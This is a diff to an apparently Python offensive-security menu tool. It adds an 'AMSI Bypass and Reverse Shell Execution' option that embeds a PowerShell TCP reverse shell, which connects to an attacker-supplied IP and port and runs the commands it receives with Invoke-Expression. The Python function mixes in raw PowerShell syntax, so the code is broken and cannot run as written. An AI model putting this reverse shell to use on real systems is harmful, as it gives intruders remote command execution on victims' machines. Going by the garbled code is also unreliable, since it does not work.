@@ -44,7 +44,6 @@ _____________________  ___________                                              
      |  |    |   |   | _.-'|    |  |      |  |      |   |
      |__|    )___(    )___(    /____\    /____\    /_____\
     (====)  (=====)  (=====)  (======)  (======)  (=======)
-    }===={  }====={  }====={  }======{  }======{  }======={
    (______)(_______)(_______)(________)(________)(_________)
    
     
@@ -122,6 +121,51 @@ def display_methodology():
     """
     print(f"{Fore.TEAL}{methodology}{Style.RESET_ALL}")
 
+# Reverse Shell Execution
+def execute_reverse_shell(ip, port):
+    code = f"""
+$ip = '{ip}'
+$port = {port}
+$e = [System.Text.Encoding]::ASCII
+$w = New-Object Net.Sockets.TCPClient($ip, $port)
+$s = $w.GetStream()
+$b = New-Object Byte[] 1024
+while (($i = $s.Read($b, 0, $b.Length)) -ne 0) {{
+    $d = ($e.GetString($b, 0, $i) -replace "`n","")
+    $r = Invoke-Expression $d 2>&1 | Out-String
+    $r2 = $r + "PS " + (pwd).Path + "> "
+    $sb = $e.GetBytes($r2)
+    $s.Write($sb, 0, $sb.Length)
+    $s.Flush()
+}}
+"""
+    # Convert and encode the PowerShell reverse shell script
+    bytes = [System.Text.Encoding]::Unicode.GetBytes($code)
+    encoded = [Convert]::ToBase64String($bytes)
+    decoded = [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded))
+    Invoke-Expression $decoded
+
+# AMSI Bypass Menu
+def amsi_bypass_menu():
+    print(f"\n{Fore.TEAL}AMSI Bypass and Reverse Shell Execution:{Style.RESET_ALL}")
+    # Prompt for Attacker IP and Port
+    ip = input(f"{Fore.YELLOW}Enter the Attacker IP: {Style.RESET_ALL}")
+    port = input(f"{Fore.YELLOW}Enter the Attacker Port: {Style.RESET_ALL}")
+    
+    # Ensure the port is numeric
+    if not port.isdigit():
+        print(f"{Fore.RED}Invalid port number! Please enter a valid port.{Style.RESET_ALL}")
+        return
+
+    # Convert the port to an integer and validate the range
+    port = int(port)
+    if port < 1 or port > 65535:
+        print(f"{Fore.RED}Port number out of range! Please enter a valid port (1-65535).{Style.RESET_ALL}")
+        return
+
+    # Execute the reverse shell with the provided IP and Port
+    execute_reverse_shell(ip, port)
+
 # Sub-menus
 def gaining_access_menu():
     print(f"\n{Fore.TEAL}Gaining Access:{Style.RESET_ALL}")
@@ -133,13 +177,14 @@ def gaining_access_menu():
         "Exploit SMB with EternalBlue",
         "Web Shell Upload",
         "Yersinia Suite",
+        "AMSI Bypass and Reverse Shell Execution",
         "Return to Main Menu"
     ]
     display_in_columns(options, column_count=2)
 
     choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
-    if choice == "7":
-        yersinia_menu()
+    if choice == "8":
+        amsi_bypass_menu()
 
 def yersinia_menu():
     print(f"\n{Fore.TEAL}Yersinia Suite:{Style.RESET_ALL}")
@@ -171,40 +216,32 @@ def yersinia_menu():
         gaining_access_menu()
 
 # Main Menu
-def display_main_menu():
-    print(f"\n{Fore.TEAL}Main Menu:{Style.RESET_ALL}")
+def main_menu():
+    display_splash_screen()
+    check_and_install_tools(['nmap', 'hydra', 'msfvenom', 'metasploit', 'veil', 'ysoserial'])
+
     options = [
-        "Check Required Tools",
-        "Reconnaissance Tools", 
-        "Scanning & Enumeration", 
-        "Gaining Access", 
-        "Proxies", 
-        "Maintaining Access", 
-        "Covering Tracks", 
-        "Reports & Results", 
-        "Methodology", 
+        "Penetration Testing Methodology",
+        "Gaining Access Menu",
+        "Yersinia Suite",
         "Exit"
     ]
-    display_in_columns(options, column_count=3)
+    display_in_columns(options)
 
-# Main Function
-def main():
-    display_splash_screen()
-    required_tools = ["nmap", "hydra", "yersinia", "metasploit"]
+    choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
+    if choice == "1":
+        display_methodology()
+    elif choice == "2":
+        gaining_access_menu()
+    elif choice == "3":
+        yersinia_menu()
+    elif choice == "4":
+        print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
+        sys.exit()
+    else:
+        print(f"{Fore.RED}Invalid choice! Please try again.{Style.RESET_ALL}")
+        main_menu()
 
-    while True:
-        display_main_menu()
-        choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
-        
-        if choice == "1":
-            check_and_install_tools(required_tools)
-        elif choice == "3":
-            gaining_access_menu()
-        elif choice == "10":
-            print(f"{Fore.RED}Exiting...{Style.RESET_ALL}")
-            break
-        else:
-            print(f"{Fore.RED}Invalid choice, please try again.{Style.RESET_ALL}")
-
+# Run the program
 if __name__ == "__main__":
-    main()
+    main_menu()
